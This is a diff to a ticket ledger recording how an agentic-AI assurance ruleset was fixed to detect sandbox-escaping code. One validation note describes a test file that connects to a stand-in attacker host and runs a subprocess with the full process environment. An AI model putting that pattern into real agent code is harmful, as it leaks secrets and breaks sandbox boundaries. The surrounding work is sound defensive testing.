@@ -10215,6 +10215,36 @@
       ],
       "dependencyDisposition": "none",
       "dependencyRationale": "No dependency added or changed. The change is JSON Schema `properties` entries, one identifier renamed in a Rego policy and its test, and two specs that read the shipped schemas and policies with node:fs. No policy logic changed -- the same violations fire on the same inputs, which is exactly what makes declaring the fields safe."
+    },
+    {
+      "id": "GT-683",
+      "closedAt": "2026-08-15",
+      "closureCommit": "4c05d9a8",
+      "evidence": [
+        "src/rulesets/topologies/agentic-ai/agentic-ai.rules.json",
+        "src/rulesets/topologies/agentic-ai/agentic-ai.rego",
+        "src/rulesets/topologies/agentic-ai/agentic-ai.test.rego",
+        "src/rulesets/topologies/agentic-ai/README.md",
+        "src/rulesets/topologies/agentic-ai/README.es.md",
+        ".harness/scripts/ci/56-validate-assurance-disclosure.mjs",
+        ".harness/scripts/ci-runner.mjs",
+        "src/packages/core-domain/src/application/validators/evaluators/agentic-ai-assurance.spec.ts",
+        "src/packages/core-domain/src/application/validators/evaluators/opa-input-builder.ts",
+        "src/packages/core-domain/src/application/validators/evaluators/handlers/architecture/agent-rules.ts",
+        "src/packages/core-domain/src/application/validators/evaluators/handlers/architecture/shared.ts"
+      ],
+      "validationCommands": [
+        "THE DEFECT, MEASURED END TO END BEFORE ANY CHANGE (wave 1): a satellite of exactly two files -- the shipped `fixtures/valid-agent.config.json` plus one runbook -- returned `AAI-R01 … AAI-R09 passed`, 9 of 9; adding `src/escape.js` with `net.connect(443,'attacker.example.com')` and `execSync(…, { env: process.env })`, the literal inverse of AAI-R02 and AAI-R05, changed NOTHING. After wave 1 that same satellite fails TWO blocking rules (R03 names the missing directory, R08 rejects the absent runbook).",
+        "WAVE 2, A/B ON THE NEW RULE: on a fully conformant satellite, adding ONE file inside the declared implementationRoots turns AAI-R10 red and removing it turns it green, with nothing else moving. Measured against our own agent-runtime: PASSED over 139 scannable files under the five declared roots, with an independent grep confirming zero occurrences -- a pass that read something.",
+        "AC4, DERIVED NOT ASSERTED: `agentic-ai-assurance.spec.ts` reads the handler source and partitions the categories by whether their branch reaches the filesystem, then checks the shipped labels against that. AAI-R03/R08/R10 = observed, the other seven = declared. MUTATIONS BOTH WAYS: labelling AAI-R02 `observed` turns 2 cases RED (the over-claim check and the pinned partition); labelling AAI-R03 `declared` turns 2 RED (the under-claim check and the partition). Restored 5/5.",
+        "AC5 DEMONSTRATED EXACTLY AS THE CRITERION ASKS: `node .harness/scripts/ci/56-validate-assurance-disclosure.mjs` exits 0 with `10 rule(s) publish the same assurance in 2 language(s) -- 3 observed, 7 declared`; flipping AAI-R02 to `observed` in README.md ALONE exits 1 with `README.md: AAI-R02 publishes \\u0060observed\\u0060, the ruleset ships \\u0060declared\\u0060`. Registered in `ci-runner governance` (18 scripts, green), which `Validate documentation` runs -- a required check on main.",
+        "AC6: agentic-ai.rego shipped NINE rules against the handler's ten. Added AAI-R10 there, fed by `hasNoSandboxBoundaryBreach` from opa-input-builder because OPA cannot read a directory. `opa check` clean, `opa test` 11/11 (was 9/9). The rego test case was observed RED before the rule existed. Three builder cases pin the halves the rego cannot express; MUTATION: removing the claim guard turns the FALSE case red.",
+        "AC7 DEFERRED IN WRITING as the criterion permits, and MEASURED rather than waved through: config-rules.ts decides 13 rules, all 13 blocking, by comparing one boolean in a self-declared JSON -- serverless 4, event-driven 3, data-mesh 3, edge-computing 3. THE CRITERION NAMED THREE TOPOLOGIES AND THERE ARE FOUR; edge-computing uses the identical pattern and was missed when this row was written. Registered as GT-696.",
+        "WHAT IS NOT CLAIMED: AAI-R05's duration/memory/CPU limits stay `declared` -- a cgroup is not visible to a static read. AAI-R10 ships ADVISORY, so on a conformant satellite a leak produces no blocking failure and a buyer reading only blocking verdicts still sees green; promoting it is a separate decision, refused here because our own agent.config.json marks AAI-R02 `partial` and a blocking rule would fail our own satellite on day one and teach everyone to waive it.",
+        "SUITES, MEASURED AFTER a full build: core-domain 1960, agent-runtime 483 (11 skipped), cli 1482, mcp 575, infra-providers 179, contracts 115."
+      ],
+      "dependencyDisposition": "none",
+      "dependencyRationale": "No dependency added or changed. The work is one field added to each rule object in a shipped JSON, one Rego rule reading a boolean the input builder already had the primitives to compute, a column in two Markdown tables, and a guard plus two specs that read those files with node:fs. The boundary scanner reuses `findDeclaredBoundaryBreaches`, already in core-domain from the second wave, through the `IFileSystem` port the builder holds."
     }
   ]
 }
